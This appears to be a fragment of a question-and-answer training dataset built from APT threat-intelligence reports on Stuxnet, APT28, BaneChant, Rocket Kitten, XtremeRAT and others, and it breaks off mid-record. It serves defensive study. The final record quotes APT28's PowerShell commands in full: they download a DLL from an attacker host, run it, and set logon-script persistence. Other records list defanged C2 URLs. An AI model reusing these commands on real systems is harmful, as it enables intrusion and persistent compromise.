    "instruction": "Medium Headline: 1.3 Stuxnet Revealed\nDuring our research, we have been constantly finding evidence confirming that the Stuxnet attack was carefully prepared. Timestamp in the file ~wtr4141.tmp indicates that the date of compilation was 03/02/2010.\nVersion 9.0 of the linker indicated that attackers used MS Visual Studio 2008 for developing Stuxnet's components. File ~wtr4141.tmp is digitally signed, and the timestamp indicates that the signature on the date of signing coincides with the time of compilation.\nExamination of the driver is even more interesting, since the timestamp of MRXCLS.sys indicates that it was compiled on 01/01/2009. An 8.0 version of the linker used to build it suggests that MS Visual Studio 2005 was for development. Using different versions of the linker may indicate as well that this project was developed by a group of people with a clear division of responsibilities.\nThe digital signature shows a later date 25/01/2010, indicating that this module, was available very early on, or was borrowed from another project.\nThe second driver was built later and a timestamp of compilation shows 25/01/2010, coinciding with the date of signature of the driver MRXCLS.sys. The same linker version was used and maybe these two drivers were created by one and the same person.\nThe timestamp signature also coincides, and it all seems to point to the date of release for this component.\nOn July 17th, ESET identified a new driver named jmidebs.sys, compiled on July 14th 2010, and signed with a certificate from a company called \"JMicron Technology Corp\". This is different from the previous drivers which were signed with the certificate from Realtek Semiconductor Corp.  It is interesting to note that both companies whose code signing certificates were used have offices in Hsinchu Science Park, Taiwan. The physical proximity of the two companies may suggest physical theft, but it's also been suggested that the certificates may have been bought from another source. For instance, the Zeus botnet is known to steal certificates, though it probably focuses on banking certificates. (As Randy Abrams pointed out: )\nThe file jmidebs.sys functions in much the same way as the earlier system drivers, injecting code into processes running on an infected machine. As Pierre-Marc Bureau pointed out in a blog at the time, it wasn't clear whether the attackers changed their certificate because the first one was exposed, or were simply using different certificates for different attacks. Either way, they obviously have significant resources to draw on. The well-planned modular architecture that characterizes the Stuxnet malware, and the large number of modules used, suggests the involvement of a fairly large and well-organized group. (See: ).\nAnother interesting finding was the string b:\\myrtus\\src\\objfre_w2k_x86\\i386\\guava.pdb found in the resource section.\nThe number of modules included in Stuxnet and the bulkiness of the developed code indicate that this malicious program was developed by a large group of people. Stuxnet is a more mature and technologically advanced (semi-)targeted attack than Aurora.\nMedium Headline: 1.4 Statistics on the Spread of the Stuxnet Worm\nThe statistical distribution of infected machines Win32/Stuxnet globally, from the beginning of the detection to the end of September, is presented in the figure below:\nAsian countries are the leaders with the largest number of Stuxnet-infected machines by. Iran is the region where the widest spread Stuxnet has been seen. If we look at the percentage distribution of the number of infections by region, we can generate the following table:\nTable 1.4.1 \u2013 The Percentage Distribution of Infections by Region\nA high volume of detections in a single region may mean that it is the major target of attackers. However, multiple targets may exist, and the promiscuous nature of the infective mechanism is likely to targeting detail. In fact, even known infection of a SCADA site isn't incontrovertible evidence that the site was specifically targeted. It has been suggested that malware could have been spread via flash drives distributed at a SCADA conference or event (as Randy Abrams pointed out in a blog at\n. Even that would argue targeting of the sector rather than individual sites, and that targeting is obvious from the payload. Distribution, however, is influenced by a number of factors apart from targeting, such as local availability of security software and adherence to good update/patching practice. Furthermore, our statistics show that the distribution of infections from the earliest days of detection shows a steep decline even in heavily-affected Iran in the days following the initial discovery of the attack, followed by a more gradual decline over subsequent months.\nHowever, the sparse information we have about actual infection of SCADA sites using (and affecting) Siemens software suggests that about a third of the sites affected are in the German process industry sector. Siemens have not reported finding any active instances of the worm: in other words, it has checked out PLCs at these sites, but it hasn't attempted to manipulate them. Heise observes that:\n\"The worm seems to look for specific types of systems to manipulate. Siemens couldn't provide any details about which systems precisely are or could be affected.\"\n()\nComprehensive analysis of how Stuxnet behaves when it hits a vulnerable installation was published by Ralph Langner, ahead of the ACS conference in Rockville in September 2010.\nHowever, the Langner analysis is contradicted in some crucial respects by analysis from other sources (). There was also some fascinating conjecture on display in an interview with Joe Weiss.\nJoe (Joseph) Weiss is, incidentally, the author of \"\", ISBN: 978-1-60650-197-9, which sounds well worth investigating for a closer look at industrial control systems (ICS) and security. The Amazon page includes pointers to some other books on related topics as well as some very positive commentary on Joe's book.\nBig Headline: 2 Microsoft, Malware and the Media\nThis section contains information on events that have taken place since the original outbreak of the Stuxnet malware. While a full-scale account of the media coverage around these events would be a long document in its own right, we present here a partial timeline which puts some of the most significant events in chronological order, ranging from initial detection on 17th of June until the date of release of this Revision. This section also contains a table (Table 2.2.1) that details posts on Stuxnet in ESET's blog. A number of other links are also given non-chronologically so that the reader can track other resources covering various topics related to Stuxnet.\nWhile Stuxnet exploits several Windows vulnerabilities, at least four of them described as 0-day:\nMS08-067 RPC Exploit ()\nMS10-046 LNK Exploit ()\nMS10-061 Spool Server Exploit ()\nTwo privilege escalation (or Elevation of Privilege) vulnerabilities:\no MS10-073 Win32k.sys Exploit ()\no MS10-092 Task Scheduler Exploit ()\nHowever, it also targets PLCs (Programming Logic Controllers) on sites using Siemens SIMATIC WinCC or STEP 7 SCADA (Supervisory Control And Data Acquisition) systems.\nMedium Headline: 2.1 SCADA, Siemens and Stuxnet\nThis attack makes additional use of a further vulnerability categorized as CVE-2010-2772, relating to the use of a hard-coded password in those systems allowing a local user to access a back-end database and gain privileged access to the system. This meant not only that the password was exposed to an attacker through reverse engineering, but, in this case, that the system would not continue to work if the password was changed, though that issue was not mentioned in Siemens' advice to its customers at Industrial Controls Engineer Jake Brodsky made some very pertinent comments in response to David Harley's blog at .\nWhile agreeing that strategically, Siemens were misguided to keep hardcoding the same access account and password into the products in question, and naive in expecting those details to stay secret, Jake pointed out, perfectly reasonably, that tactically, it would be impractical for many sites to take appropriate remedial measures without a great deal of preparation, recognizing that a critical system can't be taken down without implementing interim maintenance measures. He suggested, therefore,\nthat isolation of affected systems from the network was likely to be a better short-term measure, combined with the interim measures suggested by Microsoft for working around the .LNK and .PIF issues that were causing concern at the time (<http://support.microsoft.com/kb/2286198>)(http://support.microsoft.com/kb/2286198).\nQuestion: How does the use of different code signing certificates by Stuxnet impact the understanding of the attackers' resources and strategies? What are the potential implications of this practice?",
    "output": "Answer: The use of different code signing certificates by Stuxnet, such as those from Realtek Semiconductor Corp and JMicron Technology Corp, indicates that the attackers had significant resources. The physical proximity of the two companies in Hsinchu Science Park, Taiwan, suggests possible physical theft or acquisition from another source. This practice implies that the attackers could change certificates either because the previous ones were exposed or to use different certificates for different attacks, demonstrating their adaptability and the complexity of their operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What are the primary components of Etumbot, and how are they typically delivered to the target systems?",
    "output": "Etumbot consists of two primary components: a dropper and a backdoor binary. The dropper contains the backdoor binary and a distraction file. Typically, Etumbot is delivered via spear phishing emails using archive file extensions such as .7z or .rar. These archives often contain the Etumbot installer, which may be disguised as a legitimate document. Upon execution, the dropper extracts the backdoor binary and the distraction file, running the backdoor and displaying the decoy document to the user.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: OTHER APT28 TARGETS ARE CONSISTENT WITH NATION STATE INTERESTS\nAPT28 has targeted a variety of organizations that fall outside of the three themes we highlighted above. However, we are not profiling all of APT28's targets with the same detail because they are not particularly indicative of a specific sponsor's interests.  They do indicate parallel areas of interest to many governments and do not run counter to Russian state interests.\nOther probable APT28 targets that we have identified:\n\u2022 Norwegian Army (Forsvaret)\n\u2022 Government of Mexico\n\u2022 Chilean Military\n\u2022 Pakistani Navy\n\u2022 U.S. Defense Contractors\n\u2022 European Embassy in Iraq\n\u2022 Special Operations Forces Exhibition (SOFEX) in Jordan\n\u2022 Defense Attaches in East Asia\n\u2022 Asia-Pacific Economic Cooperation (APEC)\n\u2022 Al-Wayi News Site\nMedium Headline: OTHER\nOur analysis of some of the group's more commonly used tools indicates that APT28 has been systematically updating their malware since 2007.\nAPT28 MALWARE INDICATES\nSKILLED RUSSIAN DEVELOPERS\nAPT28's tools are suggestive of the group's skills, ambitions, and identity. Our analysis of some of the group's more commonly used tools indicates that APT28 has been systematically updating their tools since 2007.  APT28 is most likely supported by a group of developers creating tools intended for long-term use and versatility, who make an effort to obfuscate their activity. This suggests that APT28 receives direct ongoing financial and other resources from a well-established organization, most likely a nation state government. APT28's malware settings suggest that the developers have done the majority of their work in a Russian language build environment during Russian business hours, which suggests that the Russian government is APT28's sponsor.\nSome of APT28's more commonly used tools are the SOURFACE downloader, its second stage backdoor EVILTOSS, and a modular family of implants that we call CHOPSTICK.\n\u2022 SOURFACE: This downloader is typically called Sofacy within the cyber security community.  However because we have observed the name \"Sofacy\" used to refer to APT28 malware generally (to include the SOURFACE dropper, EVILTOSS, CHOPSTICK, and the credential harvester OLDBAIT), we are using the name SOURFACE to precisely refer to a specific downloader. This downloader obtains a second-stage backdoor from a C2 server. CORESHELL is an updated version of SOURFACE.\n\u2022 EVILTOSS: This backdoor has been delivered through the SOURFACE downloader to gain system access for reconnaissance, monitoring, credential theft, and shellcode execution.\n\u2022 CHOPSTICK: This is a modular implant compiled from a software framework that provides tailored functionality and flexibility.\nA number of the malware variants that we profile below, especially the CHOPSTICK family, demonstrate formal coding practices indicative of methodical, diligent programmers. The modularity of CHOPSTICK alone, with its flexible and lasting platform, demonstrates planning for long-term use and versatility. We have also noted that APT28 tailors implants to their target environments, configuring them to use local network resources such as email servers.\nAPT28 has attempted to obfuscate their code and implement counter-analysis techniques:\n\u2022 One of the latest samples of CORESHELL includes counter-reverse engineering tactics via unused machine instructions. This would hinder static analysis of CORESHELL behavior by creating a large amount of unnecessary noise in the disassembly.\n\u2022 A number of CORESHELL droppers also conduct runtime checks, attempting to determine if they are executing in an analysis environment, and if so, they do not trigger their payloads.\n\u2022 Many samples across the SOURFACE/ CORESHELL, CHOPSTICK, and EVILTOSS\nmalware families obfuscate strings that are decoded at runtime.  Two of the malware families (SOURFACE/CORESHELL and EVILTOSS) use the same decryption sequence and similar algorithms for string encoding and decoding. These families encode their strings at compile time using a custom stream cipher. From a high level, these ciphers share a similar design across the malware families but differ slightly in the internal arithmetic operations.\n\u2022 APT28 has employed RSA encryption to protect files and stolen information moved from the victim's network to the controller.\nAPT28 has made incremental and systematic changes to the SOURFACE downloader and its surrounding ecosystem since as early as 2007.  These changes indicate a long-standing and dedicated development effort behind APT28. We have observed samples of the SOURFACE downloader compiled between 2007 and 2014.  We call SOURFACE (samples are frequently named netids.dll) a first stage downloader because its primary job is to retrieve a second stage payload from a C2 server.  Until 2013, the SOURFACE downloader used hard-coded IP addresses for C2 communications, whereas the future CORESHELL samples use domains.\nMedium Headline: WHAT IS A MALWARE ECOSYSTEM?\nFirst, a malware family is a collection of malware in which each sample shares a significant amount of code with all of the others. There are exceptions: for example, some files contain public and standard code libraries that we do not take into consideration when making a family determination.\nA malware ecosystem is a group of malware families that work together to perform the same objective.  Perhaps the simplest and most typical ecosystem is a dropper and a backdoor that are used together. They may not share the same code structure, but they are related because one drops and installs the other.\nThe ecosystem surrounding the SOURFACE downloader frequently consists of a dropper, which installs SOURFACE. The SOURFACE downloader then receives another dropper from its C2 server, and this second dropper installs a second stage backdoor, which is usually EVILTOSS.\nIn April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader. They started by changing the compiled DLL name to \"coreshell.dll\" and making minor changes to the network communications, as seen in Figure 7.\nThe hostname, volume serial number and OS version data are encoded in the new URL format. As seen in the table below, the SOURFACE/ CORESHELL developers also made other modifications that changed the exported function name and file size over time.\nFigure 7: Example of modified SOURFACE vs. CORESHELL communications\nSOURFACE URL for a sample compiled April 2013: http://[hostname]/~book/cgi-bin/brvc.cgi?WINXPSP3c95b87a4-05_01\nCORESHELL URL for a sample compiled April 2013: http://[hostname]/~xh/ch.cgi?enhkZm1GNmY1YWg0eGcxMGQ1MDUwMQ==\nTable 4: Evolution of SOURFACE downloader over time\n17 SOURFACE with minor changes to network communications (see Figure 7).\n18 Basic anti-debug measures added (process listing, rand timing, is DebuggerPresent).\n19 Switches from loading a secondary DLL (netui.dll/WinIDS.dll) to uploading the contents of %temp%\\chkdbg.log.\n20 Statically links msvcrt library.\n21 Statically links msvcrt library and the strings used to identify the imported libraries and functions are reversed prior to being used, then reversed back after use.\n22This version added assembly level obfuscation, which slows down analysis. This variant requires the OS to be at least Windows Vista.\nMedium Headline: In April 2013, based on compile time, the group began to make significant alterations to the SOURFACE downloader.\nFigure 8: NATO-themed decoy delivered with possible EVILTOSS predecessor from 2004\nVariants of the SOURFACE second stage backdoor, EVILTOSS, share some code similarities with SOURFACE.  However, it contains more capabilities, including the ability to provide access to the file system and registry, enumerate network resources, create processes, log keystrokes, access stored credentials, and execute shellcode. The backdoor encrypts data that it uploads with an RSA public key. Many of its variants we have seen are named netui.dll. EVILTOSS variants may use the Simple Mail Transfer Protocol (SMTP) to send stolen data in an attachment named \"detaluri. dat\". The backdoor attaches this file to a preformatted email and sends it out through a victim's mail server.\nInterestingly, we found an antivirus report from 200423  detailing what appears to be an early variant of EVILTOSS. The backdoor was installed alongside the NATO-themed decoy document depicted in Figure 8. The backdoor sent data via SMTP to nato_smtp@mail[.]ru and received its tasking via POP from nato_pop@mail[.]ru. Although we have not conclusively attributed this sample to APT28, it does suggest the possibility that APT28 has been operating since as early as 2004.24\n23  http://ae.norton.com/security_response/print_writeup.jsp?docid=2004-081915-1004-99\n24 Although the malware family and interest in NATO make it likely that APT28 was involved, we cannot conclusively attribute this sample to APT28 based on these factors alone.  We have no evidence that they controlled the C2 for this malware or were using EVILTOSS in 2004. APT28 could have possibly obtained this source code from another group of actors.  Also, malware can be passed from group to group.  The other malware that we associate with APT28 in this paper is more strongly attributed to the group using additional factors, some of which we mention in Appendix A.\n\nWhat is the significance of the discovery of an early variant of EVILTOSS from 2004, and how does it relate to APT28's potential operational history?",
    "output": "A: The discovery of an early variant of EVILTOSS from 2004 is significant because it suggests the possibility that APT28 has been operating since as early as 2004. This variant was installed alongside a NATO-themed decoy document and used SMTP to send data to a specific email address. While conclusive attribution to APT28 is not certain, the malware family and interest in NATO align with APT28's known activities, indicating a potentially longer operational history than previously documented.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Technical Analysis: How Does it Work?\nAfter opening this malicious document, it attempts to download an XOR encoded binary (using a two byte XOR key) for the stage one payload. It was also observed that the attacker leveraged a shortened URL to \"hide\" malicious domains from automated analysis technologies. After investigation, the malicious domain was analyzed to be recently registered. See Figure 1 for the first stage download scenario.\nThe attacker has designed the stage one malware to be merely a husk. Having the decrypted executable file alone would not be useful in understanding its intent. It is because a majority of the malicious code is only available after downloading the second stage payload. The second stage payload was available as a fake \"JPEG\" file from the malicious server. By designing the malware this way, it makes it harder to perform incidence response and facilitates ease of update of malicious code. Again, in this second stage download, the malicious domain was not found in the malware. It made use of the dynamic DNS service provided by \"NO-IP\" to indirectly access the malicious domain. See Figure 2 for the second stage download scenario. The technical details of each component (shellcode and payload) will be further elaborated.\nBig Headline: Shellcode Analysis\nThe spear phishing document was in RTF format which as designed loads MSCOMCTL.ocx and exploits CVE 2012-0158. By executing return at 0x27606EFF, it will load EIP with address 0x27583C30 which is translated to be JMP ESP to execute shellcode in the stack. See the figure below.\nLike most modern shellcode, its stub decrypts its body using a simple XOR key (see Figure 4). By stepping through the shellcode, it attempts to download hxxp://ow.ly/iGKKT and saves it to the temp directory with a file name prefixed with \"moo\", e.g., \"moo1.tmp\" (see Figure 5). It is important to note that \"ow.ly\" is not a malicious domain. Instead, it is a URL shortening server. It is believed that the rational for such indirect access is to defeat automated URL blacklisting. Figure 6 depicts how a malicious URL could be shortened using this service.\nFrom the network traffic, it is obvious that the real malicious content is located at hxxp://symbisecure.com/update/winword.pkg (see Figure 7). As an excecutable file usually contains many zeros in series, the zeros would become the XOR key when XOR encoded. For example, 0xAA xor 0\u00d700 equals to 0xAA. By examining the content using a hex editor, it is obvious that there are many \"9E 44\" repeated. Hence, by trying 0x449E (little endian) as an XOR key, it would reveal that it is a PE file. At\noffset zero, it is decrypted to be \"MZ\"; at offset 0x3C, it is decrypted to be 0x00000E0; and at 0x000000E0, it is decrypted to be PE (see Figure 8).\nBy generalizing this idea, the single or double byte XOR key can be seen as a dword XOR key as it repeats over itself. For example, 0x449E XOR key could be seen as 0x449E449E. By counting the DWORD with the highest occurance, it could be a probable XOR key if the file is XOR encrypted. This should work for samples that are (1, 2 or 4, but not 3 bytes) XOR encrypted.\nBig Headline: Payload Analysis\nEven though \"winword.pkg\" is an executable husk to host malicious code downloaded at the second stage, it contains a mouse-click check to detect human behaviors. Only if the number of left clicks is three or more, will the malware proceed further to download the second stage payload \u2013 the true malicious code (see Figure 9 and Figure 10).\nAfter the malware detects sufficient mouse clicks, it proceeds to decrypt its malicious URL to download\nthe second stage payload (see Figure 11). By following the TCP stream (see Figure 12) and examining the header of the downloaded JPG file, it is obvious that downloaded content is not a JPEG file. By doing so, it effectively downloaded an executable content that is not conformed to PE format to defeat network binary extraction. A legitimate JPG file should contain the byte sequence \"FFD8FFE0xxxx4A46494600\" at offset zero, where \"4A464946\" corresponds to \"JFIF\". Below is the hardcoded URL and user-agent that is used by this malware sample.\nURL: hxxp://kibber.no-ip.org/adserv/logo.jpg\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV2)\nAfter the JPG file is downloaded and executed directly in the memory, it achieves persistency by creating a shortcut link file at the start up folder. This link file will execute a copy of itself located at \"C:\\ProgramData\\Google2\\GoogleUpdate.exe\" (see Figure 13). It would look legitimate to users as it masquerades as a legitimate Google Updater. It \"would\" appear normal if it attempts to access the Internet. In comparison, the real \"GoogleUpdate.exe\" resides in \"program files\" instead \"program data\" directory (see Figure 14).\nThe downloaded \"JPG\" file was analyzed to be a backdoor in the victim's machine. It lists the running\nprocesses, IP configuration, and directories of root drives (C to H) as depicted in Figure 15. This information is posted to hxxp://symbisecure.com/adserv/get.php in Base-64 format. After decoding, it is interesting that it begins with a Tag named \"BaneChant\". After doing a quick search, it seems to be a sound track composed by Hans Zimmer for the movie \"The Dark Knight Rises\" (see Figure 16). This is the reason we name this malware Trojan.APT.BaneChant.\nAs depicted in Figure 17, the malware could perform other tasks as listed below.\n1. Command 'g': Download and execute a file. The downloaded file has a temporarily file name prefixed with \"java\".\n2. Command 'i': Run downloaded code (fileless) as a separate thread. The user-agent used is \"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.1 (KHTML, like Gecko)\".\n3. Command 'x': Download and execute, follow by an uninstallation of \"GoogleUpdate.exe\". The downloaded file has same prefix \"java\".\n4. Command 'u': Uninstall \"GoogleUpdate.exe\"\nBig Headline: Conclusion\nAs defense technologies advance, malware also evolves. In this instance, we could see that the malware has performed a number of tricks to defeat detection.\nIt attempts to:\n1. Evade sandbox by detecting human behaviors (multiple mouse clicks);\n2. Evade network binary extraction technology by performing multi-byte XOR encryption on executable file;\n3. Social engineer user into thinking that the malware is legitimate;\n4. Avoid forensic and incidence response by using fileless malicious codes; and\n5. Prevent automated domain blacklisting by using redirection via URL shortening and Dynamic DNS services.\nThis entry was posted in (<http://www.fireeye.com/blog/category/technical/malware-research>)Advanced Malware, (<http://www.fireeye.com/blog/category/technical/targeted-attack>)Targeted Attack by (<http://www.fireeye.com/blog/author/chong-rong-hwa>)Chong Rong Hwa. Bookmark the (<http://www.fireeye.com/blog/technical/malware-research/2013/04/trojan-apt-banechant-in-memory-trojan-that-observes-for-multiple-mouse-clicks.html>)permalink.\nQuestion: How does Trojan.APT.BaneChant ensure that its true malicious intent remains hidden during initial stages of infection, and what challenges does this pose for incident response teams?",
    "output": "Answer: Trojan.APT.BaneChant ensures that its true malicious intent remains hidden by designing the initial payload as a 'husk' that lacks most of the malicious code. The actual malicious code is downloaded later from a malicious server in the form of a fake 'JPEG' file. This approach poses significant challenges for incident response teams because they cannot extract the 'true' malicious code from the disk during the initial stages of infection. Forensic investigators must wait for the additional payload to be downloaded and executed in memory, complicating the process of identifying and mitigating the threat.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: reFerenCeS\n[1] Gadi Evron and Tillmann Werner. (28 December 2014). 31st Chaos Communication Congress of the Chaos Computer Club (31C3). \"Rocket Kitten: Advanced Off-the-Shelf Targeted Attacks Against Nation States.\" Last accessed on 10 March 2015, (<https://www.youtube.com/watch?v=WIhKovlHDJ0>)https://www.youtube.com/watch?v=WIhKovlHDJ0.\n[2] Trend Micro Incorporated. (2015). Threat Encyclopedia. \"BKDR_ GHOLE.B.\" Last accessed on 13 March 2015, (<http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/BKDR_GHOLE.B>)http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ (<http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/BKDR_GHOLE.B>)BKDR_GHOLE.B.\n[3] VirusTotal. (2015). VirusTotal Scan. Last accessed on 10 March 2015, (<https://www.virustotal.com/>)https://www.virustotal.com/.\n[4] Pierluigi Paganini. (9 September 2014). Security Affairs. \"Clearsky Detected Gholee Malware\u2014The Israel-Gaza Conflict Takes to the Cyber Arena.\" Last accessed on 11 March 2015, (<http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html>)http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware. (<http://securityaffairs.co/wordpress/28170/cyber-crime/gholee-malware.html>)html.\n[5] ZeroVirus. (2015). Virus Scanner. Last accessed on 11 March 2015, (<http://av.zerodays.ir/>)http://av.zerodays.ir/.\n[6] Industrieanlagen-Betriebsgesellschaft mbH. (2015). Industrieanlagen-Betriebsgesellschaft mbH. Last accessed on 11 March 2015, (<http://www.iabg.de/en/>)http://www.iabg.de/en/.\n[7] Trend Micro Incorporated. (2015). Threat Encyclopedia. \"TSPY_ WOOLERG.A.\" Last accessed on 13 March 2015, (<http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TSPY_WOOLERG.A>)http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ (<http://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/TSPY_WOOLERG.A>)TSPY_WOOLERG.A.\nBig Headline: appenDix\nThis section provides the list of SHA1 hashes found in relation to Operation Woolen-GoldFish and their corresponding Trend Micro detection names.\nTrend Micro Incorporated, a global leader in security software, strives to make the world safe for exchanging digital information. Our innovative solutions for consumers, businesses and governments provide layered content security to protect information on mobile devices, endpoints, gateways, servers and the cloud. All of our solutions are powered by cloud-based global threat intelligence, the Trend Micro\u2122 Smart Protection Network\u2122, and are supported by over 1,200 threat experts around the globe. For more information, visit (<http://www.trendmicro.com/us/index.html>)www.trendmicro.com.\n\u00a9 2015 by Trend Micro, Incorporated. All rights reserved. Trend Micro and the Trend Micro t-ball logo are trademarks or registered trademarks of Trend Micro, Incorporated. All other product or company names may be trademarks or registered trademarks of their owners.\n225 E. John Carpenter Freeway\nSuite 1500\nIrving, Texas 75062 U.S.A.\nPhone: +1.817.569,8900\nQuestion: How did the Rocket Kitten group leverage off-the-shelf tools and techniques to conduct their advanced targeted attacks against nation states, as discussed in the 31st Chaos Communication Congress of the Chaos Computer Club (31C3)?",
    "output": "Answer: The Rocket Kitten group utilized widely available software to cover their tracks and carry out their campaigns. This included using the GHOLE malware, which had been active since 2011, in targeted attack campaigns. The group employed spear-phishing emails to penetrate their target systems, focusing on specific organizations such as those in the defense industry, IT sector, government entities, and academic organizations. By leveraging these off-the-shelf tools and techniques, Rocket Kitten was able to conduct sophisticated and well-planned cyberthreat activities, making it difficult for defenders to identify and mitigate the attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: XtremeRAT: Nuisance or Threat?\nRather than building custom malware, many threat actors behind targeted attacks use publicly or commercially available remote access Trojans (RATs). This pre-built malware has all the functionality needed to conduct cyber espionage and is controlled directly by humans, who have the ability to adapt to network defenses. As a result, the threat posed by these RATs should not be underestimated.\nHowever, it is difficult to distinguish and correlate the activity of targeted threat actors based solely on their preference to use particular malware \u2014 especially, freely available malware. From an analyst's perspective, it is unclear whether these actors choose to use this type of malware simply out of convenience or in a deliberate effort to blend in with traditional cybercrime groups, who also use these same tools.\nThere are numerous RATs available for free and for purchase in online forums, chat rooms and market places on the Internet. Most RATs are easy to use and thus attract novices. They are used for a variety of criminal activity, including \"sextortion\". [1] The ubiquity of these RATs makes it difficult to determine if a particular security incident is related to a targeted threat, cybercrime or just a novice \"script kiddie\" causing a nuisance.\nAlthough publicly available RATs are used by a variety of operators with different intents, the activity of particular threat actors can still be tracked by clustering command and control server information as well as the information that is set by the operators in the builder. These technical indicators, combined with context of an incident (such as the timing, specificity and human activity) allow analysts to assess the targeted or non-targeted nature of the threat.\nIn this post, we examine a publicly available RAT known as XtremeRAT. This malware has been used in targeted attacks as well as traditional cybercrime. During our investigation we found that the majority of XtremeRAT activity is associated with spam campaigns that typically distribute Zeus variants and other banking-focused malware. Why have these traditional cybercrime operators begun to distribute RATs? This seems odd, considering RATs require manual labor as opposed to automated banking Trojans.\nBased on our observations we propose one or more of the following possible explanations:\n1. Smokescreen\nThe operations may be part of a targeted attack that seeks to disguise itself and its possible targets, by using spam services to launch the attacks.\n2. Less traditional tools available\nWith more crimeware author arrests and/or disappearance of a number of banking Trojan developers, cybercriminals are resorting to using RATs to manually steal data, such as banking and\ncredit card details. [2]\n3. Complicated defenses require more versatile tools\nAs many traditional banking and financial institutions have improved their security practices, perhaps attackers have had a much more difficult time developing automation in their Trojans to cover all variations of these defenses; as such, RATs provide more versatility and effectiveness, at the expense of scalability.\n4. Casting a wider net\nAfter compromising indiscriminate targets, attackers may dig deeper into specific targets of interest and/or sell off the access rights of the victims' systems and their data to others.\nThese possible explanations are not mutually exclusive. One or all of them may be factors in explaining this observed activity.\nAnswer this question: What are some of the potential reasons why traditional cybercrime operators have started distributing RATs like XtremeRAT, despite the manual labor required, and how can these reasons influence the strategies of cybersecurity professionals?",
    "output": "Traditional cybercrime operators may have started distributing RATs like XtremeRAT for several reasons: 1. To create a smokescreen and disguise targeted attacks by using spam services. 2. Due to the reduced availability of traditional crimeware tools following the arrests or disappearance of banking Trojan developers. 3. Because improved security practices at financial institutions require more versatile tools, which RATs provide at the cost of scalability. 4. To cast a wider net by compromising indiscriminate targets and then selling access rights to specific victims' systems and data. Understanding these motivations can help cybersecurity professionals tailor their strategies to better detect and mitigate such threats, focusing on both automated and manual aspects of cybercrime operations.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Threat Group APT28 Slips Office Malware into Doc Citing NYC Terror Attack\nBy Ryan Sherstobitoff and Michael Rea\nNovember 7, 2017\nDuring our monitoring of activities around the APT28 threat group, McAfee Advanced Threat Research analysts identified a malicious Word document that appears to leverage the Microsoft Office Dynamic Data Exchange (DDE) technique that has been previously reported by Advanced Threat Research. This document likely marks the first observed use of this technique by APT28. The use of DDE with PowerShell allows an attacker to execute arbitrary code on a victim's system regardless whether macros are enabled. (McAfee product detection is covered in the Indicators of Compromise section at the end of the document.)\nAPT28, also known as Fancy Bear, has recently focused on using different themes. In this case it capitalized on the recent terrorist attack in New York City. The document itself is blank. Once opened, the document contacts a control server to drop the first stage of the malware, Seduploader, onto a victim's system.\nThe domain involved in the distribution of Seduploader was created on October 19, 11 days prior to the creation of Seduploader.\nThe document we examined for this post:\nFilename: IsisAttackInNewYork.docx\nSha1: 1c6c700ceebfbe799e115582665105caa03c5c9e\nCreation date: 2017-10-27T22:23:00Z\nThe document uses the recently detailed DDE technique found in Office products to invoke the command prompt to invoke PowerShell, which runs two commands. The first:\nC:\\Programs\\Microsoft\\Office\\MSWord.exe\\..\\..\\..\\..\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object\nSystem.Net.WebClient).DownloadString('hxxp://netmediaresources[.]com/config.txt');powershell -enc $e #.EXE\nThe second PowerShell command is Base64 encoded and is found in the version of config.txt received from the remote server. It decodes as follows:\n$W=New-Object System.Net.WebClient;\n$p=($Env:ALLUSERSPROFILE+\"\\vms.dll\");\n[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};\n$W.DownloadFile(\"hxxp://netmediaresources[.]com/media/resource/vms.dll \",$p); if (Test-Path $p){\n$rd_p=$Env:SYSTEMROOT+\"\\System32\\rundll32.exe\";\n$p_a=$p+\",#1\u2033;\n$pr=Start-Process $rd_p -ArgumentList $p_a;\n$p_bat=($Env:ALLUSERSPROFILE+\"\\vms.bat\");\n$text='set inst_pck = \"%ALLUSERSPROFILE%\\vms.dll\"'+\"`r`n\"+'if NOT exist %inst_pck %\n(exit)'+\"`r`n\"+'start rundll32.exe %inst_pck %,#1'\n[io.File]::WriteAllText($p_bat,$text)\nNew-Item -Path 'HKCU:\\Environment' -Force | Out-Null;\nNew-ItemProperty -Path 'HKCU:\\Environment' -Name 'UserInitMprLogonScript' -Value \"$p_bat\" -\nPropertyType String -Force | Out-Null;\n}\nThe PowerShell scripts contact the following URL to download Seduploader:\nhxxp://netmediaresources[.]com/media/resource/vms.dll\nThe Seduploader sample has the following artifacts:\nFilename: vms.dll\nSha1: 4bc722a9b0492a50bd86a1341f02c74c0d773db7\nCompile date: 2017-10-31 20:11:10\nControl server: webviewres[.]net\nThe document downloads a version of the Seduploader first-stage reconnaissance implant, which profiles prospective victims, pulling basic host information from the infected system to the attackers. If the system is of interest, then the installation of X-Agent or Sedreco usually follows.\nWe have observed APT28 using Seduploader as a first-stage payload for several years from various public reporting. Based on structural code analysis of recent payloads observed in the campaign, we see they are identical to previous Seduploader samples employed by APT28.\nWe identified the control server domain associated with this activity as webviewres[.]net, which is consistent with past APT28 domain registration techniques that spoof legitimate-sounding infrastructure. This domain was registered on October 25, a few days before the payload and malicious documents were created. The domain was first active on October 29, just days before this version of Seduploader was compiled. The IP currently resolves to 185.216.35.26 and is hosted on the name servers ns1.njal.la and ns2.njal.la.\nFurther McAfee research identified the following related sample:\nFilename: secnt.dll\nSha1: 